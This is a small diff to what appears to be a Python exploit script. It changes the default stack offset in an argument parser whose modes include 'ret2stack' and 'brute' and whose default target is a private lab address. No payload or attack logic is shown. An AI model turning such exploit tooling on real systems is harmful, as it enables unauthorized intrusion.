@@ -108,7 +108,7 @@ def req(host, sess, inner, timeout=8):
 def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("mode", choices=["build", "send", "ret2stack", "brute"])
-    ap.add_argument("--offset", type=lambda x: int(x, 0), default=0x120)
+    ap.add_argument("--offset", type=lambda x: int(x, 0), default=1060)
     ap.add_argument("--host", default="192.168.4.70")
     ap.add_argument("--marker", type=lambda x: int(x, 0))
     ap.add_argument("--out", default=None)
